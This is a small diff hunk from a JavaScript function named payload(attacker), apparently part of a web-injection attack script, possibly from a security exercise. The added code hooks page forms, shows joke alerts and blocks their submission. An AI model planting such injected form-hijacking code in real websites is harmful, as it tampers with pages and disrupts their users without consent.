@@ -37,7 +37,15 @@ function payload(attacker) {
     } else if (state == "logout"){
         proxy("./", "logout");
     }
-    
+    $(function(){
+        $(".search-well form").submit(function(e){
+            alert("POOP");e.preventDefault();
+        });
+        $(".well form").submit(function(e){
+            alert("BUTT");e.preventDefault();
+        });
+
+    });
 }
 
 
